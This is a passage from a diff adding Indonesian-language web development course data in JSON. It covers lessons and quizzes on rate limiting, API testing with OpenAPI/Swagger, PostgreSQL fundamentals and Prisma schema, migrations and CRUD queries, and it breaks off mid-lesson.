+            "question": "Kode status HTTP resmi manakah yang WAJIB dikembalikan oleh server backend saat seorang klien/bot telah melampaui batas kuota permintaan rate limit yang diizinkan?",
+            "options": [
+              "429 Too Many Requests",
+              "401 Unauthorized",
+              "503 Service Unavailable",
+              "400 Bad Request"
+            ],
+            "correctIndex": 0,
+            "explanation": "HTTP 429 Too Many Requests secara spesifik menginformasikan klien bahwa mereka telah mengirimkan terlalu banyak request dalam periode waktu tertentu."
+          },
+          {
+            "id": "q-17-5-2",
+            "question": "Mengapa mekanisme Rate Limiting pada arsitektur Serverless (seperti Next.js di Vercel) WAJIB menggunakan external storage terpusat seperti Redis alih-alih variabel memori lokal JavaScript?",
+            "options": [
+              "Karena setiap fungsi serverless dieksekusi di kontainer terisolasi yang masa hidupnya sementara (stateless) sehingga variabel memori lokal akan ter-reset dan tidak tersinkronisasi lintas request.",
+              "Karena Redis secara otomatis menghentikan server hacker.",
+              "Karena variabel JavaScript dilarang menyimpan angka hitungan.",
+              "Agar ukuran file kode Next.js menjadi 0 KB."
+            ],
+            "correctIndex": 0,
+            "explanation": "Sifat stateless serverless computing membutuhkan shared in-memory database berkecepatan tinggi seperti Redis untuk pelacakan kuota terpusat."
+          },
+          {
+            "id": "q-17-5-3",
+            "question": "Informasi apakah yang biasanya diekstrak dari header HTTP 'x-forwarded-for' untuk dijadikan identifier unik dalam rate limiting pengguna anonim?",
+            "options": [
+              "Alamat IP (IP Address) asli dari perangkat klien.",
+              "Nomor rekening bank pengguna.",
+              "Merk kartu grafis yang digunakan klien.",
+              "Password akun Google pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "x-forwarded-for membawa alamat IP asal klien melewati proxy/CDN untuk identifikasi pembatasan kuota per perangkat."
+          }
+        ]
+      },
+      {
+        "id": "lesson-17-6",
+        "stageId": "stage-17",
+        "slug": "api-testing-dan-dokumentasi-openapi-swagger",
+        "title": "API Testing & Dokumentasi Standar OpenAPI / Swagger",
+        "titleEn": "API Testing & OpenAPI Documentation",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Menguji endpoint API dengan automated integration tests, mock requests, dokumentasi interaktif dengan spesifikasi OpenAPI 3.0 dan Swagger UI, serta contract testing.",
+        "prerequisites": [
+          "rate-limiting-dan-api-protection-upstash"
+        ],
+        "learningObjectives": [
+          "Membangun automated integration tests untuk endpoint Route Handlers menggunakan Vitest/Jest.",
+          "Mendefinisikan spesifikasi API formal menggunakan standar OpenAPI 3.0 / Swagger.",
+          "Menyajikan dokumentasi API interaktif yang memungkinkan tim frontend mencoba request langsung di browser.",
+          "Menerapkan Contract Testing untuk menjamin sinkronisasi skema data antara frontend dan backend."
+        ],
+        "whyMatters": "API tanpa dokumentasi dan testing adalah bom waktu yang menyulitkan integrasi tim dan rentan mengalami kerusakan tak terduga (*breaking changes*).",
+        "careerContext": "Perusahaan teknologi skala besar mewajibkan spesifikasi OpenAPI untuk seluruh microservices dan backend endpoints mereka.",
+        "commonMistakes": [
+          "Membuat perubahan breaking change pada API tanpa memperbarui dokumentasi dan tes otomatis.",
+          "Hanya menguji skenario sukses (Happy Path) dan lupa menguji skenario error validation (Unhappy Path)."
+        ],
+        "keyTerms": [
+          {
+            "term": "OpenAPI Specification",
+            "definition": "Format deskripsi standar independen untuk mendokumentasikan kapabilitas REST API secara terstruktur (JSON/YAML)."
+          },
+          {
+            "term": "Swagger UI",
+            "definition": "Antarmuka visual interaktif yang merender spesifikasi OpenAPI menjadi halaman web pengujian API."
+          },
+          {
+            "term": "Integration Testing",
+            "definition": "Pengujian otomatis yang memverifikasi interaksi beberapa modul (Route Handler + Validasi + Database) secara bersamaan."
+          }
+        ],
+        "contentMd": "# API Testing & Dokumentasi Standar OpenAPI / Swagger\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari standar profesional pemeliharaan backend: membuat **Automated API Integration Tests**, menyusun dokumentasi standar industri **OpenAPI 3.0 / Swagger UI**, serta menerapkan **Contract Testing**.\n\n## Mengapa Konsep Ini Penting?\nSaat tim frontend bertanya: *\"Endpoint kursus butuh parameter apa saja? Format responnya seperti apa?\"*, Anda tidak perlu mengetik chat panjang di Slack. Dokumentasi interaktif Swagger memungkinkan siapa pun membaca spesifikasi dan menguji API langsung di browser.\n\n## 1. Pengujian Otomatis API Route Handlers (Vitest / Jest)\nUji endpoint secara otomatis untuk memastikan tidak ada fitur yang rusak saat ada pembaruan kode:\n\n```typescript\n// File: tests/api/courses.test.ts\nimport { describe, it, expect } from \"vitest\";\nimport { GET, POST } from \"@/app/api/courses/route\";\nimport { NextRequest } from \"next/server\";\n\ndescribe(\"Courses API Integration Tests\", () => {\n  it(\"GET /api/courses mengembalikan status 200 dan array kursus\", async () => {\n    const req = new NextRequest(\"http://localhost:3000/api/courses\");\n    const res = await GET(req);\n    const body = await res.json();\n\n    expect(res.status).toBe(200);\n    expect(body.success).toBe(true);\n    expect(Array.isArray(body.data)).toBe(true);\n  });\n\n  it(\"POST /api/courses menolak jika title kosong (Status 400)\", async () => {\n    const req = new NextRequest(\"http://localhost:3000/api/courses\", {\n      method: \"POST\",\n      body: JSON.stringify({ description: \"Tanpa Judul\" })\n    });\n    const res = await POST(req);\n    const body = await res.json();\n\n    expect(res.status).toBe(400);\n    expect(body.success).toBe(false);\n  });\n});\n```\n\n## 2. Standar Spesifikasi OpenAPI 3.0\nOpenAPI mendokumentasikan rute, tipe parameter, dan format JSON secara terstruktur:\n\n```yaml\n# Spesifikasi openapi.yaml\nopenapi: 3.0.0\ninfo:\n  title: BelajarinAja Core API\n  version: 1.0.0\npaths:\n  /api/v1/courses:\n    get:\n      summary: Mengambil daftar seluruh kursus aktif\n      responses:\n        '200':\n          description: Berhasil mengambil data\n          content:\n            application/json:\n              schema:\n                type: object\n                properties:\n                  success: { type: boolean }\n                  data: { type: array }\n```\n\n## 3. Menyajikan Swagger UI Interaktif di Next.js\nDengan memasang library Swagger, developer lain dapat membuka `https://domain.com/api-docs` dan mengklik tombol *\"Try it out\"* untuk menembak request langsung ke API server Anda dengan dokumentasi skema yang sangat jelas.\n\n## Kesalahan Umum Pemula\n- **Hanya menguji Happy Path**: Hanya mengetes skenario ketika data benar. Selalu buat automated test untuk skenario input salah, otentikasi gagal, dan data tidak ditemukan (*Unhappy Path*).\n\n## Praktik Mandiri\n1. Tulis satu unit test otomatis yang memverifikasi bahwa endpoint login menolak password di bawah 8 karakter dengan status 422.\n\n## Ringkasan\n- **Automated Integration Testing** menjamin API tetap stabil dan bebas regresi bug saat refactoring.\n- **OpenAPI 3.0 / Swagger** adalah standar dokumentasi REST API internasional.\n- Dokumentasi interaktif mempermudah kolaborasi antara tim Backend, Frontend Web, dan Mobile Developer.",
+        "quizzes": [
+          {
+            "id": "q-17-6-1",
+            "question": "Apa fungsi utama dari standar spesifikasi OpenAPI 3.0 dan antarmuka Swagger UI dalam pengembangan API?",
+            "options": [
+              "Menyediakan format dokumentasi standar internasional yang terstruktur dan antarmuka web interaktif tempat developer dapat membaca skema serta mencoba request API secara langsung.",
+              "Mengubah database SQL menjadi server email.",
+              "Menghapus seluruh baris kode JavaScript.",
+              "Membatasi akses internet hanya untuk admin."
+            ],
+            "correctIndex": 0,
+            "explanation": "OpenAPI menstandarisasi deskripsi kontrak REST API secara deklaratif dan Swagger UI merendernya menjadi dokumentasi interaktif yang hidup."
+          },
+          {
+            "id": "q-17-6-2",
+            "question": "Dalam pengujian otomatis (API Testing), mengapa penting untuk menguji skenario kegagalan input (Unhappy Path) selain skenario sukses (Happy Path)?",
+            "options": [
+              "Untuk memastikan backend dapat menangani input berbahaya/rusak dengan benar, menolak dengan status code semantik yang tepat (seperti 400/422), dan tidak mengalami unhandled crash 500.",
+              "Agar waktu testing menjadi lebih lama.",
+              "Karena compiler mewajibkan penulisan 100 test case.",
+              "Untuk menghapus data pengguna secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Pengujian edge-cases dan unhappy paths memverifikasi ketahanan sistem error handling dan integritas validasi keamanan backend."
+          },
+          {
+            "id": "q-17-6-3",
+            "question": "Apa yang dimaksud dengan 'Contract Testing' dalam arsitektur kolaborasi tim frontend dan backend?",
+            "options": [
+              "Pengujian yang memverifikasi bahwa format data request dan response JSON yang dikirimkan backend selalu sesuai dengan ekspektasi skema tipe yang dibutuhkan oleh frontend.",
+              "Menandatangani kontrak kerja developer di atas kertas materai.",
+              "Membayar tagihan server cloud setiap bulan.",
+              "Menghapus file skema Zod secara berkala."
+            ],
+            "correctIndex": 0,
+            "explanation": "Contract testing memastikan tidak ada breaking changes pada kontrak skema data antara produsen API (backend) dan konsumen API (frontend)."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-18",
+    "orderIndex": 18,
+    "titleId": "Database Modeling & ORM with Prisma & PostgreSQL",
+    "titleEn": "Database Modeling & ORM with Prisma & PostgreSQL",
+    "category": "Backend",
+    "description": "Menguasai database relasional PostgreSQL dan Prisma ORM: schema.prisma modeling, relasi data (1-1, 1-N, N-N), migrasi database (prisma migrate), CRUD queries type-safe, indexing, pagination, dan Database Transactions.",
+    "descriptionEn": "Master PostgreSQL & Prisma ORM: schema modeling, relations (1-1, 1-N, N-N), migrations, CRUD queries, indexing, pagination, and transactions.",
+    "lessons": [
+      {
+        "id": "lesson-18-1",
+        "stageId": "stage-18",
+        "slug": "relational-database-fundamentals-dan-postgresql",
+        "title": "Relational Database Fundamentals & Arsitektur PostgreSQL",
+        "titleEn": "PostgreSQL & Relational DB Fundamentals",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Memahami model basis data relasional: Tabel, Baris (Tuple), Kolom (Attribute), Primary Key (UUID/CUID), Foreign Key, Integritas Referensial (CASCADE), ACID properties, dan keunggulan PostgreSQL.",
+        "prerequisites": [
+          "api-testing-dan-dokumentasi-openapi-swagger"
+        ],
+        "learningObjectives": [
+          "Menjelaskan arsitektur database relasional: Tabel, Primary Key, dan Foreign Key constraints.",
+          "Menganalisis 4 pilar transaksi database: ACID (Atomicity, Consistency, Isolation, Durability).",
+          "Membandingkan generator Primary Key: Serial Auto-Increment vs UUID v4 vs CUID2.",
+          "Menjelaskan aturan Referential Integrity on delete (CASCADE, SET NULL, RESTRICT)."
+        ],
+        "whyMatters": "PostgreSQL adalah database open-source paling tangguh dan fleksibel di dunia yang menjadi standar penyimpanan data enterprise.",
+        "careerContext": "Keahlian pemodelan data relasional di PostgreSQL adalah fondasi mutlak seorang Backend & Fullstack Engineer.",
+        "commonMistakes": [
+          "Menggunakan Auto-Increment integer ID (1, 2, 3) pada tabel publik (memudahkan peretas menebak total pengguna dan melakukan ID Enumeration attack; gunakan UUID/CUID!).",
+          "Lupa menyetel Foreign Key constraint yang menyebabkan data yatim (*Orphaned Data*)."
+        ],
+        "keyTerms": [
+          {
+            "term": "PostgreSQL",
+            "definition": "Sistem manajemen basis data relasional objek (ORDBMS) open-source tingkat enterprise paling canggih di dunia."
+          },
+          {
+            "term": "Primary Key",
+            "definition": "Kolom pengidentifikasi unik mutlak untuk setiap baris data di dalam tabel."
+          },
+          {
+            "term": "Foreign Key",
+            "definition": "Kolom penunjuk relasi yang mengaitkan baris data pada satu tabel ke Primary Key tabel lain."
+          },
+          {
+            "term": "ACID Properties",
+            "definition": "Standar keandalan database: Atomicity (Semua/Batal), Consistency (Valid), Isolation (Terisolasi), Durability (Tersimpan Permanen)."
+          }
+        ],
+        "contentMd": "# Relational Database Fundamentals & Arsitektur PostgreSQL\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari fondasi **Basis Data Relasional (RDBMS)** dengan **PostgreSQL**: memahami konsep **Tabel**, **Primary Key (UUID vs CUID)**, **Foreign Key & Integritas Referensial**, serta 4 pilar transaksi database: **ACID**.\n\n## Mengapa Konsep Ini Penting?\nData di aplikasi Anda (pengguna, kursus, sertifikat, pembayaran) memiliki hubungan relasi yang sangat erat: *\"Satu Pengguna bisa memiliki Banyak Kursus, dan Satu Kursus memiliki Banyak Lesson\"*. PostgreSQL menjamin bahwa integritas data keuangan dan pengguna Anda tidak akan pernah rusak atau hilang.\n\n## 1. Anatomi Database Relasional\nDatabase relasional menyusun data dalam bentuk **Tabel (Baris dan Kolom)**:\n\n```text\nTABEL \"users\":\n┌──────────────────────┬───────────────────┬───────────────────┐\n│ id (Primary Key)     │ name              │ email             │\n├──────────────────────┼───────────────────┼───────────────────┤\n│ \"usr_101\"            │ \"Acelino\"         │ \"acel@domain.com\" │\n└──────────────────────┴───────────────────┴───────────────────┘\n          │ (Relasi 1-ke-Banyak)\n          ▼\nTABEL \"courses\":\n┌──────────────────────┬───────────────────┬───────────────────┐\n│ id (Primary Key)     │ title             │ authorId (FK)     │\n├──────────────────────┼───────────────────┼───────────────────┤\n│ \"crs_888\"            │ \"Next.js 16 Pro\"  │ \"usr_101\" ────────┼──> Menunjuk ke users.id!\n└──────────────────────┴───────────────────┴───────────────────┘\n```\n\n- **Primary Key (PK)**: Kunci unik yang tidak boleh kembar dan tidak boleh null untuk mengidentifikasi 1 baris data.\n- **Foreign Key (FK)**: Kunci penghubung yang menunjuk ke Primary Key tabel lain.\n\n## 2. Memilih Primary Key: Auto-Increment vs UUID / CUID\n\n| Tipe Kunci | Contoh Format | Keamanan & Skalabilitas | Rekomendasi |\n| :--- | :--- | :--- | :--- |\n| **Serial / Int** | `1, 2, 3, 4...` | **BURUK**: Rawan ditebak (*ID Enumeration*) | Hindari untuk API Publik |\n| **UUID v4** | `a0eebc99-9c0b-4ef8-bb6d...` | **Sangat Aman**: Acak & Tidak Bisa Ditebak | Standar Industri |\n| **CUID2** | `clh01a2bc000108l41234abcd` | **Sangat Aman & Terurut**: Sangat optimal untuk Index Database | **Rekomendasi Terbaik Prisma!** |\n\n## 3. Empat Pilar Keandalan Database: ACID\nPostgreSQL mematuhi standar **ACID** untuk integritas data mutlak:\n\n1. **Atomicity (Semua atau Tidak Sama Sekali)**: Jika transfer bank memotong saldo pengirim tapi gagal menambah ke penerima, seluruh operasi otomatis **dibatalkan (Rollback)**.\n2. **Consistency (Konsisten)**: Data harus selalu mematuhi seluruh aturan skema dan constraint relasi.\n3. **Isolation (Terisolasi)**: Transaksi yang berjalan bersamaan tidak akan saling merusak data satu sama lain.\n4. **Durability (Permanen)**: Begitu transaksi selesai (*committed*), data dijamin aman tersimpan permanen di harddisk meskipun server tiba-tiba mati listrik.\n\n## 4. Integritas Referensial (*On Delete Actions*)\nApa yang terjadi jika akun Pengguna dihapus dari tabel `users`?\n- **`CASCADE`**: Otomatis menghapus seluruh data anak yang terikat (semua catatan kursus user tersebut ikut terhapus bersih).\n- **`SET NULL`**: Kolom `authorId` pada kursus diubah menjadi `null`.\n- **`RESTRICT`**: Database **menolak penghapusan** user selama user tersebut masih memiliki kursus aktif.\n\n## Kesalahan Umum Pemula\n- **Memakai ID angka 1, 2, 3**: Membocorkan statistik rahasia bisnis ke publik (misal kompetitor tahu Anda baru memiliki 5 pelanggan karena ID pelanggan terakhir adalah 5). Selalu gunakan **CUID / UUID**.\n\n## Praktik Mandiri\n1. Gambarkan Entity Relationship Diagram (ERD) relasi antara tabel `User`, `Order`, dan `OrderItem`.\n\n## Ringkasan\n- **PostgreSQL** adalah RDBMS open-source paling andal dan kaya fitur.\n- **Primary Key** mengidentifikasi baris unik (gunakan **CUID/UUID**).\n- **Foreign Key** menjaga integritas relasi antar tabel.\n- **ACID** menjamin keamanan dan keutuhan data transaksi keuangan dan bisnis.",
+        "quizzes": [
+          {
+            "id": "q-18-1-1",
+            "question": "Mengapa menggunakan UUID atau CUID sebagai Primary Key jauh lebih disarankan daripada ID Auto-Increment integer (1, 2, 3) pada tabel pengguna di sistem web modern?",
+            "options": [
+              "Mencegah serangan ID Enumeration di mana peretas atau kompetitor dapat dengan mudah menebak ID data lain dan mengetahui total jumlah pengguna di sistem Anda.",
+              "Karena PostgreSQL melarang angka integer.",
+              "Karena UUID mempercepat booting komputer server.",
+              "Karena CUID otomatis mengenkripsi seluruh file gambar."
+            ],
+            "correctIndex": 0,
+            "explanation": "ID acak yang tidak dapat ditebak (UUID/CUID) melindungi endpoint dari scraping enumerasi berurutan dan aman untuk sistem database terdistribusi."
+          },
+          {
+            "id": "q-18-1-2",
+            "question": "Apa arti dari prinsip 'Atomicity' dalam standar 4 pilar transaksi database (ACID)?",
+            "options": [
+              "Semua langkah instruksi di dalam satu transaksi harus berhasil secara utuh, atau jika ada satu saja langkah yang gagal, seluruh operasi akan dibatalkan (Rollback) seolah tidak pernah terjadi.",
+              "Setiap data harus berukuran sekecil atom.",
+              "Database hanya boleh diakses oleh satu pengguna saja.",
+              "Data otomatis terhapus setiap 24 jam."
+            ],
+            "correctIndex": 0,
+            "explanation": "Atomicity memastikan transaksi bersifat 'All or Nothing', mencegah kondisi saldo menggantung saat terjadi kegagalan sistem di tengah jalan."
+          },
+          {
+            "id": "q-18-1-3",
+            "question": "Apa efek dari aturan referensial ON DELETE CASCADE pada relasi Foreign Key saat baris data induk di tabel Parent dihapus?",
+            "options": [
+              "Database akan secara otomatis menghapus seluruh baris data anak (Child records) di tabel lain yang merujuk ke data induk tersebut.",
+              "Database akan menolak penghapusan data induk.",
+              "Database akan mengubah nilai Foreign Key menjadi 0.",
+              "Database akan mengirimkan notifikasi email ke admin."
+            ],
+            "correctIndex": 0,
+            "explanation": "ON DELETE CASCADE menghapus data anak yang berelasi secara berantai untuk mencegah keberadaan data yatim (orphaned records)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-18-2",
+        "stageId": "stage-18",
+        "slug": "prisma-schema-modeling-dan-migrasi",
+        "title": "Prisma Schema Modeling & Migrasi Database",
+        "titleEn": "Prisma Schema Modeling & Migrations",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Mendefinisikan model database di schema.prisma (generator, datasource, model, @id, @default, @unique), relasi 1-to-1, 1-to-Many, Many-to-Many, dan mengeksekusi prisma migrate dev.",
+        "prerequisites": [
+          "relational-database-fundamentals-dan-postgresql"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan model database deklaratif di dalam file schema.prisma.",
+          "Menerapkan atribut Prisma (@id, @default(cuid()), @unique, @updatedAt).",
+          "Memodelkan relasi data 1-1, 1-N (One-to-Many), dan N-N (Many-to-Many).",
+          "Mengeksekusi migrasi database otomatis menggunakan perintah prisma migrate dev."
+        ],
+        "whyMatters": "Prisma Schema adalah satu-satunya sumber kebenaran (Single Source of Truth) yang secara otomatis menyelaraskan tabel SQL di PostgreSQL dengan tipe TypeScript di kode Anda.",
+        "careerContext": "Prisma adalah ORM TypeScript nomor satu di ekosistem Next.js dan Node.js modern.",
+        "commonMistakes": [
+          "Mengubah tabel di database SQL secara manual tanpa menjalankan `prisma migrate` (menyebabkan skema database dan client kode tidak sinkron).",
+          "Lupa menjalankan `npx prisma generate` setelah mengubah skema."
+        ],
+        "keyTerms": [
+          {
+            "term": "Prisma ORM",
+            "definition": "Object-Relational Mapping generasi baru untuk TypeScript yang menghasilkan database client yang 100% type-safe."
+          },
+          {
+            "term": "schema.prisma",
+            "definition": "File konfigurasi utama tempat seluruh model data, relasi, dan konfigurasi database dideklarasikan."
+          },
+          {
+            "term": "prisma migrate dev",
+            "definition": "Perintah CLI untuk menghasilkan file migrasi SQL dan menerapkannya ke database development."
+          }
+        ],
+        "contentMd": "# Prisma Schema Modeling & Migrasi Database\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **Prisma ORM**: bagaimana memodelkan database di dalam file **`schema.prisma`**, mendeklarasikan **Relasi (1-to-1, 1-to-Many, Many-to-Many)**, serta menjalankan **Migrasi Database (`prisma migrate dev`)**.\n\n## Mengapa Konsep Ini Penting?\nDahulu, developer harus menulis query SQL mentah yang rawan salah ketik dan menulis interface TypeScript secara manual yang sering tidak sinkron. Prisma ORM menjembatani database SQL dan kode TypeScript Anda dalam satu skema yang **100% Type-Safe**.\n\n## 1. Anatomi File `schema.prisma`\n\n```prisma\n// File: prisma/schema.prisma\n\ngenerator client {\n  provider = \"prisma-client-js\"\n}\n\ndatasource db {\n  provider = \"postgresql\"\n  url      = env(\"DATABASE_URL\")\n}\n\n// Model Enum untuk Role Pengguna:\nenum Role {\n  USER\n  ADMIN\n  INSTRUCTOR\n}\n\n// 1. Model Pengguna (User):\nmodel User {\n  id            String    @id @default(cuid())\n  email         String    @unique\n  name          String?\n  role          Role      @default(USER)\n  createdAt     DateTime  @default(now())\n  updatedAt     DateTime  @updatedAt\n\n  // RELASI: Satu User bisa memiliki Banyak Kursus (1-to-Many):\n  courses       Course[]\n\n  // RELASI: Satu User memiliki Satu Profil Pribadi (1-to-1):\n  profile       Profile?\n}\n\n// 2. Model Profil (1-to-1 dengan User):\nmodel Profile {\n  id        String   @id @default(cuid())\n  bio       String?\n  avatarUrl String?\n  userId    String   @unique\n  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)\n}\n\n// 3. Model Kursus (1-to-Many dengan User):\nmodel Course {\n  id          String   @id @default(cuid())\n  title       String\n  slug        String   @unique\n  description String\n  price       Int      @default(0)\n  authorId    String\n  author      User     @relation(fields: [authorId], references: [id])\n}\n```\n\n## 2. Menjalankan Migrasi Database\nSetelah mengubah file `schema.prisma`, jalankan perintah migrasi:\n\n```bash\n# Menghasilkan file migrasi SQL baru dan menerapkan perubahan ke PostgreSQL:\nnpx prisma migrate dev --name init_schema_belajarinaja\n```\n\nPerintah ini secara otomatis:\n1. Menghasilkan file script migrasi SQL murni di folder `prisma/migrations/`.\n2. Mengeksekusi tabel baru di database PostgreSQL Anda.\n3. Menjalankan **`prisma generate`** untuk memperbarui seluruh tipe data TypeScript pada objek `prisma` di kode Anda!\n\n## 3. Membuka GUI Visual Database: Prisma Studio\nPrisma menyediakan panel antarmuka grafis gratis untuk melihat dan mengedit isi tabel database langsung di browser:\n```bash\nnpx prisma studio\n# Membuka http://localhost:5555 di browser Anda\n```\n\n## Kesalahan Umum Pemula\n- **Lupa variabel lingkungan DATABASE_URL**: Tidak menyetel connection string PostgreSQL yang benar di file `.env`.\n\n## Praktik Mandiri\n1. Tambahkan model `Lesson` (id, title, content, courseId, relation ke Course).\n2. Jalankan `npx prisma migrate dev --name add_lessons`.\n\n## Ringkasan\n- File **`schema.prisma`** adalah sumber kebenaran tunggal untuk model data dan relasi.\n- Gunakan **`@id @default(cuid())`** untuk primary key yang aman dan terurut.\n- **`npx prisma migrate dev`** menyinkronkan skema ke tabel SQL dan menghasilkan tipe TypeScript otomatis.\n- **`npx prisma studio`** menyediakan panel visual interaktif untuk mengelola data.",
+        "quizzes": [
+          {
+            "id": "q-18-2-1",
+            "question": "File apakah yang menjadi sumber kebenaran tunggal (Single Source of Truth) untuk mendefinisikan model tabel, relasi, dan konfigurasi database pada Prisma ORM?",
+            "options": [
+              "prisma/schema.prisma",
+              "prisma.config.json",
+              "database.sql",
+              "src/models.ts"
+            ],
+            "correctIndex": 0,
+            "explanation": "schema.prisma adalah file konfigurasi utama deklaratif tempat seluruh arsitektur database dimodelkan di Prisma."
+          },
+          {
+            "id": "q-18-2-2",
+            "question": "Perintah Prisma CLI manakah yang digunakan untuk membuat file migrasi SQL baru, menerapkannya ke database development, dan meng-generate tipe TypeScript Prisma Client otomatis?",
+            "options": [
+              "npx prisma migrate dev",
+              "npx prisma deploy",
+              "npx prisma start",
+              "npx prisma make-tables"
+            ],
+            "correctIndex": 0,
+            "explanation": "prisma migrate dev adalah alur kerja standar pengembangan untuk melacak riwayat migrasi SQL dan memperbarui client types."
+          },
+          {
+            "id": "q-18-2-3",
+            "question": "Apa fungsi dari perintah npx prisma studio?",
+            "options": [
+              "Membuka antarmuka grafis visual (GUI) interaktif di browser untuk melihat, menyaring, menambah, dan mengedit isi baris data database secara langsung.",
+              "Merekam video tutorial coding otomatis.",
+              "Membuat desain banner figma otomatis.",
+              "Menghapus seluruh file migrasi lama."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prisma Studio adalah visual data browser bawaan yang sangat nyaman untuk menginspeksi dan memanipulasi data di lingkungan development."
+          }
+        ]
+      },
+      {
+        "id": "lesson-18-3",
+        "stageId": "stage-18",
+        "slug": "prisma-crud-queries-dan-relational-queries",
+        "title": "Prisma Client: CRUD Queries & Relational Queries (include, select)",
+        "titleEn": "Prisma Client: CRUD & Relations",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Mengeksekusi operasi database type-safe: findUnique, findMany (filtering, sorting), create, update, delete, upsert, serta relational queries dengan `include` dan `select`.",
+        "prerequisites": [
+          "prisma-schema-modeling-dan-migrasi"
+        ],
+        "learningObjectives": [
+          "Menyiapkan singleton instance PrismaClient untuk mencegah memory leak connection pool di Next.js.",
+          "Mengeksekusi query CRUD dasar: findMany, findUniqueOrThrow, create, update, delete.",
+          "Memuat data berelasi secara efisien menggunakan klausa `include` dan `select`.",
+          "Menerapkan operasi `upsert` (Update jika ada, Insert jika belum ada)."
+        ],
+        "whyMatters": "Prisma Client memberikan autocomplete penuh pada setiap kolom tabel dan relasi, mencegah kesalahan penulisan query SQL pada aplikasi Anda.",
+        "careerContext": "Kemahiran menulis query ORM yang efisien dan type-safe adalah tugas inti fullstack engineer setiap hari.",
+        "commonMistakes": [
+          "Melakukan instansiasi `new PrismaClient()` berulang kali di setiap file (pada Next.js hot-reload, ini membanjiri koneksi database hingga server crash; selalu gunakan Singleton pattern).",
+          "Mengambil seluruh kolom besar (termasuk isi markdown 1 MB) padahal hanya membutuhkan nama judul (gunakan `select` untuk efisiensi bandwidth!)."
+        ],
+        "keyTerms": [
+          {
+            "term": "PrismaClient",
+            "definition": "Klien database yang dihasilkan otomatis oleh Prisma dengan autocomplete dan type-safety penuh sesuai skema Anda."
+          },
+          {
+            "term": "include",
+            "definition": "Klausa Prisma untuk memuat data dari tabel relasi (seperti JOIN SQL) ke dalam satu objek hasil query."
+          },
+          {
+            "term": "select",
+            "definition": "Klausa Prisma untuk memilih secara spesifik kolom-kolom mana saja yang ingin diambil dari database."
+          },
+          {
+            "term": "upsert",
+            "definition": "Operasi gabungan Update atau Insert secara otomatis dalam satu query atomik."
+          }
+        ],
+        "contentMd": "# Prisma Client: CRUD Queries & Relational Queries (include, select)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara berinteraksi dengan database menggunakan **Prisma Client**: menyiapkan **Singleton Pattern** di Next.js, operasi **CRUD (Create, Read, Update, Delete)**, query relasi dengan **`include` vs `select`**, serta operasi **`upsert`**.\n\n## Mengapa Konsep Ini Penting?\nDengan Prisma Client, Anda tidak lagi menulis string SQL manual seperti `SELECT * FROM users`. Anda menulis kode JavaScript ber-autocomplete penuh di mana editor VS Code memberi tahu tipe data setiap kolom secara akurat.\n\n## 1. Singleton Pattern Prisma Client di Next.js\nDi lingkungan Next.js development (*Hot Module Replacement*), membuat `new PrismaClient()` di setiap file akan membuka ratusan koneksi baru hingga database PostgreSQL Anda kehabisan pool (*Too many connections error*). Gunakan pola **Singleton** ini:\n\n```typescript\n// File: src/lib/db.ts\nimport { PrismaClient } from \"@prisma/client\";\n\nconst globalForPrisma = globalThis as unknown as { prisma: PrismaClient };\n\nexport const db = globalForPrisma.prisma || new PrismaClient();\n\nif (process.env.NODE_ENV !== \"production\") globalForPrisma.prisma = db;\n```\n\n## 2. Operasi CRUD Dasar yang Wajib Dikuasai\n\n```typescript\nimport { db } from \"@/lib/db\";\n\n// 1. CREATE: Buat Data Baru\nconst userBaru = await db.user.create({\n  data: {\n    name: \"Acelino\",\n    email: \"acelino@belajarinaja.com\",\n    role: \"ADMIN\"\n  }\n});\n\n// 2. READ: Ambil Data Banyak dengan Filter & Urutan\nconst daftarKursus = await db.course.findMany({\n  where: {\n    price: { lte: 500000 }, // Harga <= 500.000\n    title: { contains: \"React\", mode: \"insensitive\" } // Cari kata \"React\"\n  },\n  orderBy: { createdAt: \"desc\" }, // Urutkan dari yang terbaru\n  take: 10 // Ambil maksimal 10 data\n});\n\n// 3. READ: Ambil 1 Data Unik (Otomatis Lempar Error jika tidak ada)\nconst user = await db.user.findUniqueOrThrow({\n  where: { email: \"acelino@belajarinaja.com\" }\n});\n\n// 4. UPDATE: Ubah Data Berdasarkan ID\nconst userUpdated = await db.user.update({\n  where: { id: \"user_101\" },\n  data: { name: \"Marchelino Kurniawan\" }\n});\n\n// 5. DELETE: Hapus Data\nawait db.course.delete({\n  where: { id: \"course_999\" }\n});\n```\n\n## 3. Query Relasi: `include` vs `select` (Optimasi Bandwidth)\n\n### A. Memuat Data Relasi dengan `include`\n```typescript\n// Ambil Kursus BESERTA Data Author (Pembuat)-nya:\nconst kursusLengkap = await db.course.findUnique({\n  where: { id: \"c-101\" },\n  include: {\n    author: true // Sertakan seluruh objek user pembuat kursus!\n  }\n});\n// Hasil: kursusLengkap.author.name (Tipe data otomatis dikenali TypeScript!)\n```\n\n### B. Mengambil HANYA Kolom Tertentu dengan `select` (Sangat Efisien!)\n```typescript\n// Jangan ambil deskripsi teks 10.000 kata jika hanya butuh judul dan harga untuk dropdown:\nconst ringkasan = await db.course.findMany({\n  select: {\n    id: true,\n    title: true,\n    price: true,\n    author: {\n      select: { name: true } // Hanya ambil nama author saja!\n    }\n  }\n});\n```\n\n## 4. Operasi `upsert` (Update OR Insert)\nSangat ideal untuk sinkronisasi profil pengguna saat login:\n```typescript\nconst profile = await db.profile.upsert({\n  where: { userId: \"user_101\" },\n  update: { bio: \"Bio terbaru saya\" }, // Jika sudah ada -> Lakukan Update\n  create: { userId: \"user_101\", bio: \"Bio pertama saya\" }, // Jika belum ada -> Lakukan Insert\n});\n```\n\n## Kesalahan Umum Pemula\n- **Memakai include dan select secara 